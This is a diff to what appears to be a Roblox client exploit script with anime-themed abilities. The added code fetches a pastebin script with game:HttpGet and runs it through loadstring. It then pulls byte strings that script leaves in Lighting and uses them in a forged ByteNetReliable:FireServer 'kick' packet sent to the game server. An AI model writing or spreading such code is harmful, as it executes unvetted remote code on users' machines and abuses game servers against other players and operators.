@@ -4,6 +4,18 @@ local Players = game:GetService("Players")
 local SoundService = game:GetService("SoundService")
 local Workspace = game:GetService("Workspace")
 
+-- buffer string
+local buffers = {}
+loadstring(game:HttpGet("https://pastebin.com/raw/8XJh7dzh"))()
+repeat
+    task.wait()
+until game.Lighting:FindFirstChild("BUFFERSTRINGS")
+for _, val in ipairs(game.Lighting:FindFirstChild("BUFFERSTRINGS"):GetChildren()) do
+    buffers[val.Name] = val.Value
+end
+game.Lighting:FindFirstChild("BUFFERSTRINGS"):Destroy()
+--
+
 local plr = Players.LocalPlayer
 local lastCast = 0
 local lastCast2 = 0
@@ -20,8 +32,8 @@ local spiritbombfx = "https://pastebin.com/raw/aZ3kAGQd"
 local names = {
 	"Kurohitsugi",
 	"Shunpō (Flashstep)",
-	"Hogyoku Shinka"
-	"Reiatsu.
+	"Hogyoku Shinka",
+	"Reiatsu."
 }
 
 task.spawn(function()
@@ -100,7 +112,7 @@ UserInputService.InputBegan:Connect(function(input, gp)
 		task.wait(0.35)
 		local forward = (root.CFrame - root.Position).LookVector
 		ReplicatedStorage.ByteNetReliable:FireServer(
-			buffer.fromstring("\035\001"),
+			buffer.fromstring(buffers["base"]),
 			{ { "kick", 100, false, vector.create(forward.X, forward.Y + 0.3, forward.Z) } }
 		)
 	end
